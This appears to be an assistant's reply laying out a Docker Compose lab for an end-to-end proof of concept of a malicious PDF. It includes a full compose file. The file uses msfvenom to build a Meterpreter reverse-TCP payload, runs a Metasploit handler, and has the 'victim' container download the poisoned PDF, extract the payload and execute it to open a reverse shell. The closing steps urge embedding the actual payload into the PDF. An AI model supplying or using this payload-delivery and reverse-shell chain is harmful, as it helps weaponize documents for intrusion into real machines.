Switching to containers can give you an extremely lightweight, reproducible lab for an end‑to‑end PoC. Here’s one way to wire it up:

---

## 1. Overall Docker‑Compose Topology

```
                ┌───────────────┐
                │  attacker     │
                │  (Kali image) │
                └──────┬────────┘
                       │ listen 4444
    poc‑net            ▼
             ┌────────────────┐     HTTP    ┌────────────────┐
             │  http-server   │◀───────────▶│   target       │
             │ (python:3.10)  │             │ (Ubuntu image) │
             └────────────────┘             └────────────────┘
```

- **attacker** will generate the PDF, run `msfconsole`/`nc -lvp 4444`, and serve your PoC files via SSH‑mounted volume or HTTP.  
- **http‑server** hosts the full payload (for a 2‑stage download) or even the PDF if you prefer.  
- **target** pulls down the PDF, runs a small script (simulating the PDF‑JS extraction) and executes the stager, yielding a reverse shell back to **attacker**.

All three live on a single user‑defined bridge network (`poc‑net`), so you don’t have to fuss with public IPs or firewalls.  

---

## 2. Example `docker-compose.yml`

```yaml
version: "3.8"
services:
  attacker:
    image: kalilinux/kali-rolling
    container_name: poc_attacker
    cap_add: 
      - NET_ADMIN
    networks:
      - poc-net
    volumes:
      - ./output:/opt/poc         # host folder where PDF & payload land
    command: >
      bash -lc "
        apt update && apt install -y metasploit-framework nc curl pdftk &&
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > /opt/poc/shell.elf &&
        # (optional) build your PDF here, drop into /opt/poc/attack.pdf
        msfconsole -q -x 'use exploit/multi/handler;
                         set payload linux/x86/meterpreter/reverse_tcp;
                         set LHOST attacker;
                         set LPORT 4444;
                         run'"
  http-server:
    image: python:3.10-slim
    container_name: poc_http
    networks:
      - poc-net
    working_dir: /opt/serve
    volumes:
      - ./output:/opt/serve
    command: python3 -m http.server 8000
  target:
    image: ubuntu:22.04
    container_name: poc_victim
    networks:
      - poc-net
    depends_on:
      - http-server
    volumes:
      - ./output:/opt/poc
    command: >
      bash -lc "
        apt update && apt install -y poppler-utils curl netcat &&
        # 1) simulate user downloading the poisoned PDF
        curl -s http://http-server:8000/attack.pdf -o /tmp/attack.pdf &&
        # 2) simulate Acrobat‑JS extraction: use pdftk to unpack the embedded payload
        pdftk /tmp/attack.pdf unpack_files output /tmp/ &&
        # 3) give it execute permissions and run
        chmod +x /tmp/shell.elf && /tmp/shell.elf"
networks:
  poc-net:
    driver: bridge
```

- **`attacker`** uses `msfvenom` → writes `shell.elf` into `./output`, then spins up a handler.  
- **`http-server`** serves everything in `./output` at `http://http-server:8000/`.  
- **`target`** downloads `attack.pdf` , unpacks payload via `pdftk` (mimicking your JS stage), and runs it—triggering a callback to `attacker:4444`.

---

## 3. Feasibility & Limitations

1. **No Windows containers**  
   - Docker on Linux cannot run real Acrobat‑JS or Windows binaries. For a true Windows PoC you’d still need a VM/WSL2 or a Windows‑based container host.  
2. **PDF‑JS stage is simulated**  
   - We use `pdftk unpack_files` in the container rather than a real PDF‑JS engine. This lets you validate your embed+extract logic end‑to‑end.  
3. **Networking is trivial**  
   - All services speak by name (`attacker`, `http-server`, `target`) over the `poc-net` bridge. No NAT or port‑forwarding headaches.  
4. **Rapid iteration**  
   - Change your embedding script (or the PDF itself) on the host; simply `docker-compose up --build` to retest.  
5. **Logging & cleanup**  
   - All inputs/outputs live in `./output`. Tear down with `docker-compose down -v` and start fresh.

---

### Next Steps

- **Embed your actual payload** into the PDF in `./output/attack.pdf` (e.g. via a Python or Node script mounted into the `attacker` service).  
- **Swap** the `pdftk unpack_files` call in `target` for a headless JS runner—or simply test your JS manually against the PDF.  
- **Confirm** the Metasploit session lands in the `attacker` container’s console.
